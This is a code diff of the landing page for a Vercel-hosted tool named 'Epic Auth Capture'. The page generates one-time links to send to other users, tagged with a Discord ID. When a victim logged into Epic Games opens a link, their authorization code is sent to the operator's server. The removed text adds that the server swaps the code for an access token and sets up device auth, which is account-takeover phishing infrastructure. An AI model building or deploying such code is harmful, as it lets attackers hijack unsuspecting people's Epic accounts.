@@ -1,70 +1,83 @@
 /**
  * GET /
- * Landing page — shows a test link you can open or send to another PC.
- * All state is in-memory (no DB), everything logged to console (Vercel logs).
+ * Landing page — Person A visits this to generate a link.
  */
-
 export default function handler(req, res) {
   const base = `https://${req.headers.host}`;
-  const testDiscordId = 'TEST_USER_123';
-  const startUrl = `${base}/start?discord_id=${testDiscordId}`;
-
-  console.log('[INDEX] Landing page hit from', req.headers['x-forwarded-for'] || 'local');
-
+  console.log('[INDEX] hit from', req.headers['x-forwarded-for'] || 'local');
   res.setHeader('Content-Type', 'text/html');
   res.send(`<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Epic Auth Capture — Test</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Epic Auth Capture</title>
   <style>
-    body { background: #0d0d0d; color: #e0e0e0; font-family: monospace; padding: 40px; max-width: 800px; margin: auto; }
-    h1 { color: #00ff99; }
-    h2 { color: #aaa; font-size: 1em; font-weight: normal; margin-top: 0; }
-    a { color: #00aaff; word-break: break-all; }
-    .box { background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 20px; margin: 20px 0; }
-    .label { color: #888; font-size: 0.85em; margin-bottom: 6px; }
-    .code { color: #00ff99; font-size: 0.95em; word-break: break-all; }
-    .note { color: #666; font-size: 0.85em; margin-top: 12px; }
-    .btn { display: inline-block; background: #00ff99; color: #000; padding: 12px 24px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 16px; }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #080808; color: #d0d0d0;
+      font-family: -apple-system,'Segoe UI',system-ui,sans-serif;
+      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px;
+    }
+    .card {
+      background: #101010; border: 1px solid #1e1e1e;
+      border-radius: 20px; padding: 44px 40px;
+      max-width: 500px; width: 100%;
+    }
+    h1 { font-size: 1.5em; color: #fff; margin-bottom: 8px; }
+    .sub { color: #555; font-size: 0.88em; line-height: 1.6; margin-bottom: 32px; }
+    label { display: block; font-size: 0.75em; color: #444; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 8px; }
+    input {
+      width: 100%; background: #141414; border: 1px solid #252525;
+      border-radius: 10px; color: #fff; padding: 13px 15px;
+      font-size: 0.95em; outline: none; margin-bottom: 14px; transition: border .15s;
+    }
+    input:focus { border-color: #00e676; }
+    input::placeholder { color: #333; }
+    button {
+      width: 100%; background: #00e676; color: #000;
+      border: none; border-radius: 10px; padding: 15px;
+      font-size: 1em; font-weight: 700; cursor: pointer; transition: opacity .15s;
+    }
+    button:hover { opacity: .85; }
+    .how { margin-top: 32px; border-top: 1px solid #161616; padding-top: 24px; }
+    .how-title { font-size: 0.75em; color: #333; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 14px; }
+    .step { display: flex; gap: 12px; margin-bottom: 10px; align-items: flex-start; }
+    .sn {
+      width: 22px; height: 22px; border-radius: 50%; background: #181818;
+      color: #444; font-size: 0.75em; font-weight: 700;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .st { font-size: 0.83em; color: #444; line-height: 1.5; }
+    .st strong { color: #666; }
   </style>
 </head>
 <body>
-  <h1>🎮 Epic Auth Capture — Test Server</h1>
-  <h2>Vercel-hosted · no DB · everything logged to console</h2>
+<div class="card">
+  <h1>🎮 Epic Auth Capture</h1>
+  <p class="sub">Generate a unique one-time link. Send it to the user. When they click it and confirm on Epic, the auth code arrives here automatically — no matter what network they're on.</p>
 
-  <div class="box">
-    <div class="label">TEST LINK — open this on a PC that is logged into Epic Games:</div>
-    <div class="code"><a href="${startUrl}">${startUrl}</a></div>
-    <a class="btn" href="${startUrl}">Click to Test (this machine)</a>
-    <div class="note">
-      Or copy the link and open it on another PC / browser that has an Epic Games session.<br>
-      The auth code will be captured and printed in Vercel logs.
-    </div>
-  </div>
+  <form onsubmit="generate(event)">
+    <label>Discord User ID (optional label)</label>
+    <input type="text" id="discordId" placeholder="e.g. 123456789012345678" autocomplete="off">
+    <button type="submit">Generate Link</button>
+  </form>
 
-  <div class="box">
-    <div class="label">How it works:</div>
-    <pre style="color:#ccc;margin:0;font-size:0.85em">
-1. /start generates a state token (in-memory, no DB)
-2. Redirects browser to:
-   epicgames.com/id/login
-     ?redirectUrl=epicgames.com/id/api/redirect
-                    ?clientId=3f69e56c... (Android client)
-                    &amp;responseType=code
-                    &amp;redirectUrl=THIS_SERVER/callback
-                    &amp;state=STATE_TOKEN
-3. Epic sees user is logged in → skips login page
-4. /id/api/redirect captures their session → 302 to /callback?code=AUTH_CODE&amp;state=...
-5. /callback logs the code, exchanges it for an access token, creates device auth
-6. ALL printed to Vercel function logs — check your dashboard
-    </pre>
+  <div class="how">
+    <div class="how-title">How it works</div>
+    <div class="step"><div class="sn">1</div><div class="st">You enter a Discord ID and click <strong>Generate Link</strong></div></div>
+    <div class="step"><div class="sn">2</div><div class="st">A unique one-time URL is created and shown — send it to the user</div></div>
+    <div class="step"><div class="sn">3</div><div class="st">User clicks the link on <strong>any PC, any network</strong> — as long as Epic is logged in</div></div>
+    <div class="step"><div class="sn">4</div><div class="st">Auth code + full chain result appear here <strong>automatically</strong> — no refresh, no paste</div></div>
   </div>
-
-  <div class="box">
-    <div class="label">Check logs at:</div>
-    <div class="code">Vercel Dashboard → Your Project → Functions → Logs</div>
-    <div class="note">Or run: vercel logs --follow (in terminal)</div>
-  </div>
+</div>
+<script>
+function generate(e) {
+  e.preventDefault();
+  const id = document.getElementById('discordId').value.trim() || 'unknown';
+  window.location.href = '/generate?discord_id=' + encodeURIComponent(id);
+}
+</script>
 </body>
 </html>`);
 }
